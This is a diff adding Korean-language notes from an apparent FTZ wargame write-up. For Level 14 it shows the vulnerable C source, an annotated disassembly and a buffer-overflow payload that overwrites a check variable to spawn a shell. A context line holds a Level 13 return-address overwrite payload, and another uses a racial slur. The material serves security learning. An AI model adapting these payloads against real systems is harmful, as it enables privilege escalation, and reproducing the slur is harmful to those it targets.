@@ -327,3 +327,71 @@ Segmentation fault
 ./attackme $(python -c 'print "A"*1036+"\x67\x45\x23\x01"+"A"*12+"\xc5\xf2\xff\xbf"')
 
 답 == what that nigga want?
+
+
+
+
+
+#================================================================================#
+#FTZ Level 14
+hint)
+레벨14 이후로는 mainsource의 문제를 그대로 가져왔습니다.
+버퍼 오버플로우, 포맷스트링을 학습하는데는 이 문제들이
+최고의 효과를 가져다줍니다.
+
+#include <stdio.h>
+#include <unistd.h>
+ 
+main()
+{ int crap;
+  int check;
+  char buf[20];
+  fgets(buf,45,stdin);
+  if (check==0xdeadbeef)
+   {
+     setreuid(3095,3095);
+     system("/bin/sh");
+   }
+}  
+
+
+#FTZ Level 14 풀이 과정)
+포맷스크링을 공부하고 진행했다.
+쉽게 말해서 %x나 %n %임의정수x 등 포맷과정에서 제대로된 포맷형식이 아니면 다음 address의 값을 바꿀 수 있다.
+일단, attackme를 까보는게 좋다. 
+/tmp/14에서 복사하여 진행했다.
+
+Dump of assembler code for function main:
+0x08048490 <main+0>:	push   ebp
+0x08048491 <main+1>:	mov    ebp,esp
+0x08048493 <main+3>:	sub    esp,0x38          // stack 56byte 공간 확장. int 변수 2개, char [20] , dummy 포함 56byte
+0x08048496 <main+6>:	sub    esp,0x4
+0x08048499 <main+9>:	push   ds:0x8049664		 //Data Segment : 0x8049664 위치에 있는 것을 stack에 저장.
+0x0804849f <main+15>:	push   0x2d				 //45
+0x080484a1 <main+17>:	lea    eax,[ebp-56] 	 //buf
+0x080484a4 <main+20>:	push   eax
+0x080484a5 <main+21>:	call   0x8048360 <fgets>
+0x080484aa <main+26>:	add    esp,0x10
+0x080484ad <main+29>:	cmp    DWORD PTR [ebp-16],0xdeadbeef // ebp-16 위치에 0xdeadbeef가 올수 있도록 입력하면 코드 실행.
+0x080484b4 <main+36>:	jne    0x80484db <main+75>
+0x080484b6 <main+38>:	sub    esp,0x8
+0x080484b9 <main+41>:	push   0xc17
+0x080484be <main+46>:	push   0xc17
+0x080484c3 <main+51>:	call   0x8048380 <setreuid>
+0x080484c8 <main+56>:	add    esp,0x10
+0x080484cb <main+59>:	sub    esp,0xc
+0x080484ce <main+62>:	push   0x8048548
+0x080484d3 <main+67>:	call   0x8048340 <system>
+0x080484d8 <main+72>:	add    esp,0x10
+0x080484db <main+75>:	leave  
+0x080484dc <main+76>:	ret    
+0x080484dd <main+77>:	lea    esi,[esi]
+End of assembler dump.
+어셈블리어를 보면 ebp-16위치에 deadbeef가 오면 된다. 그럼 56-16은 40이니,
+bof를 하려면 40바이트를 채워주고 deadbeef를 리틀엔디언 형식으로 넣어주면 자동으로 실행되도록 코딩이 되어있다.
+
+(python -c 'print"A"*40 + "\xef\xbe\xad\xde"'; cat)  | /home/level14/attackme
+하면 일단 쉘은 작동하고 비번은 얻어 낼 수 있다.
+
+
+답 == guess what
